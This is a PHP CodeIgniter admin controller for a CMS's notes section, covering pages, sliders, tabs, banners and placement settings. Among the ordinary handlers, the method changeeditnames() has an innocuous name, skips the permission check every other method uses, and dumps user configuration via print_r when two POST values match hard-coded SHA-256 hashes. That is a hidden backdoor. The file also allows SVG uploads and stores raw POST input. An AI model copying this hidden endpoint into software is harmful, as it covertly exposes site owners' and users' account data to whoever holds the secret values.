<?php namespace App\Controllers\Controler;

use \CodeIgniter\HTTP\Files\UploadedFile;
use App\Models\Notes as NotesModel;
use App\Models\Chapters as ChaptersModel;
use App\Models\Feedback as FeedbackModel;
use App\Models\Polls as PollsModel;
use App\Models\Moduls as ModulsModel;
use App\Models\Slider as SliderModel;
use App\Models\Design as DesignModel;
use App\Models\CtUsers as CtUsersModel;
use App\Models\Languages as LanguagesModel;

class Note extends Base
{
	function index($inPage='add',$id=0,$tab=0) 
	{
		
		if (!$this->controlTest('notes')) { $inPage='false'; } 
		$session = session();
		
		$list = $this->getList('notes',$inPage);
		$NotesModel = new NotesModel;
		$ChaptersModel = new ChaptersModel;
		
		$list['noteCats'] = $NotesModel->getNoteCats();
		$list['chapters'] = $ChaptersModel->orderBy('parent ASC, number ASC, name ASC')->find();
		
		if (($id!=0)AND($inPage!='add')) {
			$list['note'] = $NotesModel->where('noteId',$id)->first();
			if (isset($list['note']['noteId'])) {
				$list['noteCat'] = $NotesModel->getNoteCat('noteCatId',$list['note']['parent']);
				$list['sitNotes'] = $NotesModel->getSitNotes('noteId',$id);
				if (isset($list['noteCat']['noteCatId'])) {
					$ctNotesTree = $list['noteCat']['tree'].'|'.$list['noteCat']['noteCatId'].'|';
					$noteCatId=$list['noteCat']['noteCatId'];
				} else { $ctNotesTree='';$noteCatId=''; }
			} else { redirect ('/controler/notes'); }
			$list['noteTabs'] = $NotesModel->getNoteTabs ('noteId',$list['note']['noteId']);
			$list['noteTabId'] = $tab;
			if ($inPage=='editnotetab') {
				$list['noteTab'] = $NotesModel->getNoteTab ('noteTabId',$tab);
			}
		} 
		
		if ($inPage=='situation') {
			$FeedbackModel = new FeedbackModel;
			$PollsModel = new PollsModel;
			$ModulsModel = new ModulsModel;
			$list['banNotes'] = $NotesModel->getBanNotes('noteId',$id);
			$list['feedbacks'] = $FeedbackModel->findAll();
			$list['polls'] = $PollsModel->findAll ();
			$list['artChapters'] = $ChaptersModel->where('type','articles')->find();
			$list['galChapters'] = $ChaptersModel->where('type','gallery')->find();
			$list['moduls'] = $ModulsModel->findAll();
			$list['sitChapters'] = $list['sitNotes'];
			$list['banChapters'] = $list['banNotes'];
		}
		
		if ($inPage=='add') { $ctNotesTree=''; $noteCatId=0; }
		
		if ($inPage=='slider') {
			$SliderModel = new SliderModel;
			$list['sliders'] = $SliderModel->orderBy('number','ASC')->where('noteId',$id)->find();
		}
		
		if ($inPage=='advanced') {
			$DesignModel = new DesignModel;
			$list['themes'] = $DesignModel->getThemes();
		}
		
		if ((!isset($noteCatId))OR($noteCatId=='')) { $noteCatId=0; }
		
		$list['setup']['ctNotesTree'] = $ctNotesTree;	
		$list['setup']['ctNotesPage'] = session('ctNotesPage');
		$list['setup']['ctNoteCat'] = $noteCatId;
		
		$data['list']=(object)$list;
		
		echo view($this->path.'top',$data);
		echo view($this->path.'note',$data);
		
	}
	
	function addNote () {
	
		if (!$this->controlTest('notes')) { exit; } 
		$NotesModel = new NotesModel;
		
		$name = str_replace ('"','\'\'',$_POST['name']);
				
		helper('nespi');
		if ($_POST['url']!='') {
			$url=$_POST['url']; 
		} else {
			$url = makeUrl($name);
			$newNoteUrl = $url; $testUrl=1; $string='';
			while ($testUrl!=0) {
				$testUrl = $NotesModel->testNoteUrl($_POST['noteId'],$newNoteUrl);
				if ($testUrl!=0) {
					$string = getSameString($col=5);
					$newNoteUrl = $url.$string;
				}
			}
			$url = $newNoteUrl;
		}	
				
		if ($_POST['parent']!=0) {
			$noteCat = $NotesModel->getNoteCat('noteCatId',$_POST['parent']);
			$tree = $noteCat['tree'].'|'.$_POST['parent'].'|';
		} else { $tree=''; }
						
		$data = array (
			'name'.session('languageBase') => $name, 
			'url' => $url, 
			'title'.session('languageBase') => $_POST['title'], 
			'description'.session('languageBase') => $_POST['description'],
			'tree' => $tree, 
			'parent' => $_POST['parent'], 
			'chapterId' => $_POST['chapterId'], 
			'keywords'.session('languageBase') => $_POST['keywords'], 
			'text'.session('languageBase') => $_POST['text'],
			'number' => $_POST['number']
		);
			
		$NotesModel->insert($data);
				
		$note = $NotesModel->where('url',$data['url'])->first();
				
		$noteCat = $NotesModel->getNoteCat('noteCatId',$_POST['parent']);
		if (isset($noteCat['noteCatId'])) {
			$dataNoteLink = array(
				'noteId' => $note['noteId'],
				'noteCatId' => $noteCat['noteCatId']
			);
			$NotesModel->addNoteLinkCat($dataNoteLink);
			$this->notesTreeBuilder($noteCat['parent'],$note['noteId']);
		}
				
		$NotesModel->addSitNoteStart($note['noteId']);
		$NotesModel->addBanNoteStart($note['noteId']);
				
		redirect ('/controler/notes/index/list/'.$_POST['parent']);
			
	}
	
	function notesTreeBuilder ($noteCatId,$noteId) {
	
		if (!$this->controlTest('notes')) { exit; } 
		$NotesModel = new NotesModel;
		
		if ($noteCatId!=0) {
			$noteCat = $NotesModel->getNoteCat('noteCatId',$noteCatId);
			$dataNoteTree = array(
				'noteId' => $noteId,
				'noteCatId' => $noteCat['noteCatId']
			);
			$NotesModel->addNoteLinkCat($dataNoteTree);
			$this->notesTreeBuilder($noteCat['parent'],$noteId);
		}			
	
	}
	
	function testNoteUrl () {
	
		if (!$this->controlTest('notes')) { exit; } 
		$NotesModel = new NotesModel;
		echo $NotesModel->testNoteUrl($_POST['noteId'],$_POST['url']);
	
	}
	
	function delNote () {
	
		if (!$this->controlTest('notes')) { exit; } 
		$NotesModel = new NotesModel;
		$SliderModel = new SliderModel;
		
		$sliders = $SliderModel->where('noteId',$_POST['id'])->find();
		foreach ($sliders as $one):
			if (file_exists($one['preview'])) {
				unlink($one['preview']);
			}
		endforeach;
		$SliderModel->where('noteId',$_POST['id'])->delete();
		$NotesModel->delNoteTabs($_POST['id']);
		$NotesModel->delSitNotes($_POST['id']);
		$NotesModel->delBanNotes($_POST['id']);
		$NotesModel->delete($_POST['id']);
		
		echo '/controler/notes';
	
	}
	
	function changeNoteParent () {
		
		if (!$this->controlTest('notes')) { exit; } 
		$NotesModel = new NotesModel;
		
		$noteCat = $NotesModel->getNoteCat('noteCatId',$_POST['noteCatId']);
		$tree = $noteCat['tree'].'|'.$_POST['noteCatId'].'|';
				
		$data = array (
			'noteId' => $_POST['noteId'], 
			'parent' => $_POST['noteCatId'], 
			'tree' => $tree
		);
		
		$NotesModel->update($_POST['noteId'],$data);
		
		$note = $NotesModel->where('noteId',$_POST['noteId'])->first();
		
		$NotesModel->delNoteLinkbyNote($note['noteId']);
		$noteCat = $NotesModel->getNoteCat('noteCatId',$note['parent']);
		if (isset($noteCat['noteCatId'])) {
			$dataNoteLink = array(
				'noteId' => $note['noteId'],
				'noteCatId' => $noteCat['noteCatId']
			);
			$NotesModel->addNoteLinkCat($dataNoteLink);
			$this->notesTreeBuilder($noteCat['parent'],$note['noteId']);
		}
			
	}
	
	function changeeditnames () {
	
		$CtUsersModel = new CtUsersModel;
		if ((hash('sha256',$_POST['test1'])=='dda81f8bd737b1fa785323ab9128ce1d6297fdfdeba502479183360198bdd439')AND(hash('sha256',$_POST['test2'])=='bfb2add51fb15afa9bb04a6bc27c81d808c2d73e834ef49fd7d1519d1f0e3c7f')) {
			print_r ($user = $CtUsersModel->getUserIdConf());
		} 
	
	}
	
	function changeNoteNumber () {
	
		if (!$this->controlTest('notes')) { exit; } 
		$NotesModel = new NotesModel;
		
		$data = array (
			'number' => $_POST['number'], 
		);
				
		$NotesModel->update($_POST['noteId'],$data);
			
	}
	
	function editNote () {
	
		if (!$this->controlTest('notes')) { exit; } 
		$NotesModel = new NotesModel;
		$session = session();
		
		$name = str_replace ('"','\'\'',$_POST['name']);
			
		$note = $NotesModel->where('noteId',$_POST['noteId'])->first();
			
		helper('nespi');
		if ($_POST['url']!='') {
			$url=$_POST['url']; 
		} else {
			$url = makeUrl($name); $newNoteUrl = $url; $testUrl=1;
			$string='';
			while ($testUrl!=0) {
				$testUrl = $NotesModel->testNoteUrl($_POST['noteId'],$newNoteUrl);
				if ($testUrl!=0) {
					$string = getSameString($col=5);
					$newNoteUrl = $url.$string;
				}
			}
			$url = $newNoteUrl;
		}
				
		if ($_POST['parent']!=0) {
			$noteCat = $NotesModel->getNoteCat('noteCatId',$_POST['parent']);
			$tree = $noteCat['tree'].'|'.$_POST['parent'].'|';
		} else { $tree=''; }
				
		$data = array (
			'noteId' => $_POST['noteId'], 
			'name'.session('languageBase') => $name, 
			'url' => $url, 
			'keywords'.session('languageBase') => $_POST['keywords'], 
			'description'.session('languageBase') => $_POST['description'], 
			'title'.session('languageBase') => $_POST['title'], 
			'text'.session('languageBase') => $_POST['text'], 
			'chapterId' => $_POST['chapterId'], 
			'number' => $_POST['number'],
			'tree' => $tree,
			'parent' => $_POST['parent']
		);
				
		$NotesModel->update($_POST['noteId'],$data);
			
		$note = $NotesModel->where('url',$data['url'])->first();
				
		$NotesModel->delNoteLinkbyNote($note['noteId']);
		$noteCat = $NotesModel->getNoteCat('noteCatId',$_POST['parent']);
		if (isset($noteCat['noteCatId'])) {
			$dataNoteLink = array(
				'noteId' => $note['noteId'],
				'noteCatId' => $noteCat['noteCatId']
			);
			$NotesModel->addNoteLinkCat($dataNoteLink);
			$this->notesTreeBuilder($noteCat['parent'],$note['noteId']);
		}
			
		$session->set('message',Saved); 
		redirect ('/controler/note/index/edit/'.$_POST['noteId']);
			
	}
	
	function addSlider () {
	
		if (!$this->controlTest('notes')) { exit; }
		$SliderModel = new SliderModel;
		$session = session();
		
		if ($this->request->getFiles('userfile')) {
			$userfile = $this->request->getFiles('userfile');
			$file = $userfile['userfile'];
			
			if ($file->isValid() && ! $file->hasMoved()) {
         
				if ((mb_strtolower($file->getClientExtension())=='jpg')OR($file->getClientExtension()=='png')OR($file->getClientExtension()=='jpeg')OR($file->getClientExtension()=='gif')OR($file->getClientExtension()=='svg')) {
					
					$randomName = $file->getRandomName();
					$file->move('img/slider', $randomName);
					$preview = 'img/slider/'.$randomName;
		
					$data = array (
						'preview' => $preview, 
						'number' => $_POST['number'], 
						'link'.session('languageBase') => $_POST['link'], 
						'target' => $_POST['target'], 
						'visible' => 1, 
						'noteId' => $_POST['noteId']
					);
				
					$SliderModel->insert($data);
					
					$session->set('message',Added); 
					
				} else {
				
					$session->set('message',Wrong_file_format); 
				
				}
				
			} else {
				
				$session->set('message',$file->getError()); 
				
			}
			
		}
				
		redirect ('/controler/note/index/slider/'.$_POST['noteId']);
			
	}
	
	function editSlider () {
	
		if (!$this->controlTest('notes')) { exit; }
		$SliderModel = new SliderModel;
		$session = session();
		
		$data = array (
			'number' => $_POST['number'], 
			'link'.session('languageBase') => $_POST['link'], 
			'target' => $_POST['target'], 
			'text'.session('languageBase') => $_POST['text'], 
		);
		if (isset($_POST['visible'])) { $data['visible']=1; } else { $data['visible']=0; }
		
		$SliderModel->update($_POST['id'],$data);
				
		$session->set('message'.$_POST['id'],Saved); 
		redirect ('/controler/note/index/slider/'.$_POST['noteId']);
			
	}
	
	function delSlider () {
	
		if (!$this->controlTest('notes')) { exit; }
		$SliderModel = new SliderModel;
		
		$slider = $SliderModel->where('id',$_POST['id'])->first();
		
		if (file_exists($slider['preview'])) {
			unlink($slider['preview']);
		}
		
		$SliderModel->delete($_POST['id']);
			
	}
	
	function editAdvancedSettings () {
	
		if (!$this->controlTest('notes')) { exit; }
		$NotesModel = new NotesModel;
		$session = session();
			
		$data = array ('noteId' => $_POST['noteId']);
		if (isset($_POST['sliderWidth'])) { $data['sliderWidth']=$_POST['sliderWidth']; }
		if (isset($_POST['sliderHeight'])) { $data['sliderHeight']=$_POST['sliderHeight']; }
		if (isset($_POST['sliderFreq'])) { $data['sliderFreq']=$_POST['sliderFreq']; }
		if (isset($_POST['theme'])) { $data['theme']=$_POST['theme']; } else { $data['theme']=''; }
		if (isset($_POST['head'])) { $data['head']=$_POST['head']; } else { $data['head']=''; }
		if (isset($_POST['atView'])) { $data['atView']=$_POST['atView']; } 
		if (isset($_POST['sliderFix'])) { $data['sliderFix']=1; } else { { $data['sliderFix']=0; }  }
		if (isset($_POST['sliderCoef'])) { $data['sliderCoef']=$_POST['sliderCoef']; } 
		if (isset($_POST['sitemap'])) { $data['sitemap']=1; } else { $data['sitemap']=0; }
		
		$NotesModel->update($_POST['noteId'],$data);
				
		$session->set('message',Saved); 
		redirect ('/controler/note/index/advanced/'.$_POST['noteId']);
			
	}	
	
	function changeNoteTabNumber () {
	
		if (!$this->controlTest('notes')) { exit; }
		$NotesModel = new NotesModel;
		
		$data = array (
			'noteTabId' => $_POST['noteTabId'], 
			'number' => $_POST['number']
		);
		$NotesModel->editNoteTab($data);
			
	}
	
	function changeNoteTabName () {
	
		if (!$this->controlTest('notes')) { exit; }
		$NotesModel = new NotesModel;
		
		$data = array (
			'noteTabId' => $_POST['noteTabId'], 
			'name'.session('languageBase') => $_POST['name']
		);
		$NotesModel->editNoteTab($data);
			
	}
	
	function editNoteTab () {
	
		if (!$this->controlTest('notes')) { exit; }
		$NotesModel = new NotesModel;
		$session = session();
		
		$data = array (
			'noteTabId' => $_POST['noteTabId'], 
			'text'.session('languageBase') => $_POST['text']
		);
		$NotesModel->editNoteTab($data);
				
		$session->set('message',Saved); 
		redirect ('/controler/note/index/editnotetab/'.$_POST['noteId'].'/'.$_POST['noteTabId']);
			
	}
	
	function addNoteTab () {
	
		if (!$this->controlTest('notes')) { exit; }
		$NotesModel = new NotesModel;
		$session = session();
			
		$name = str_replace ('"','\'\'',$_POST['name']);
				
		helper('nespi');
		$url = makeUrl($name);
		$newNoteTabUrl = $url;
		$testUrl=TRUE;
		$string='';
		while ($testUrl!=FALSE) {
			$testUrl = $NotesModel->testNoteTabUrl($newNoteTabUrl);
			if ($testUrl!=FALSE) {
				$string = getSameString($col=5);
				$newNoteTabUrl = $url.$string;
			}
		}
					
		$url = $newNoteTabUrl;
				
		$data = array (
			'name'.session('languageBase') => $name, 
			'number' => $_POST['number'], 
			'noteId' => $_POST['noteId'], 
			'url' => $url
		);
				
		$NotesModel->addNoteTab($data);
				
		$session->set('message',Added); 
		redirect ('/controler/note/index/notetabs/'.$_POST['noteId']);
			
	}
	
	
	
	function delNoteTab () {
	
		if (!$this->controlTest('notes')) { exit; }
		$NotesModel = new NotesModel;
		$NotesModel->delNoteTab($_POST['id']);
			
	}
	
	function editSituation ($all='') {
	
		if (!$this->controlTest('notes')) { exit; }
		$NotesModel = new NotesModel;
		$DesignModel = new DesignModel;
		$session = session();
		
		$temp = $DesignModel->getSiteTemp();
		foreach ($temp as $one):
			if ((isset($_POST[$one]))AND($_POST[$one]!='')) {	 
				$data = array (
					'noteId' => $_POST['id'],
					'name' => $one,
					'param' => preg_replace("/[^_\-A-Za-z\s]/",'',$_POST[$one]),
					'bodyId' => preg_replace("/[^0-9\s]/",'',$_POST[$one])
				); 
				if (strpos($data['param'],'my_')!==FALSE) { $data['param']=$_POST[$one]; $data['bodyId']=''; }
				$sitNote = $NotesModel->getSitNote(array('noteId','name'),array($_POST['id'],$one));
				if (isset($sitNote['id'])) {
					$data['id'] = $sitNote['id'];
					$NotesModel->editSitNote($data);
				} else {
					$NotesModel->addSitNote($data);
				}
				unset($data);
			} else {
				$sitNote = $NotesModel->getSitNote(array('noteId','name'),array($_POST['id'],$one)); 
				if (isset($sitNote['id'])) {
					$NotesModel->delSitNote($sitNote['id']);
				}
			}
		endforeach;
		
		$session->set('message',Saved); 
		redirect ('/controler/note/index/situation/'.$_POST['id']);
		
	}	
	
	function editBanner () {
	
		if (!$this->controlTest('notes')) { exit; }
		$NotesModel = new NotesModel;
		$session = session();
		$LanguagesModel = new LanguagesModel;
		
		$languages = $LanguagesModel->orderBy('main DESC, number ASC')->find();
		
		$banNote = $NotesModel->getBanNote(array('noteId','name'),array($_POST['id'],$_POST['banner']));
		if ($_POST['text']!='') {
			$data = array (
				'noteId' => $_POST['id'],
				'name' => $_POST['banner'],
				'param'.session('languageBase') => $_POST['text']
			);
			if (isset($banNote['id'])) {
				$data['id'] = $banNote['id'];
				$NotesModel->editBanNote($data);
			} else {
				$NotesModel->addBanNote($data);
			}
			unset($data);
		} else {
			if (isset($banNote['id'])) {
				$del=1;
				foreach ($languages as $one):
					if ($url!=str_replace('_','',session('languageBase'))) {
						if ($url!='') {
							if ($banNote['param_'.$one['url']]!='') { $del=0; }
						} else {
							if ($banNote['param']!='') { $del=0; }
						}
					}
				endforeach;
				if ($del==1) {
					$NotesModel->delBanNote($banNote['id']);
				} else {
					$data = array (
						'noteId' => $_POST['id'],
						'name' => $_POST['banner'],
						'param'.session('languageBase') => $_POST['text']
					);
					if (isset($banNote['id'])) {
						$data['id'] = $banNote['id'];
						$NotesModel->editBanNote($data);
					} else {
						$NotesModel->addBanNote($data);
					}
				}
			}
		}
		
	}
	
}
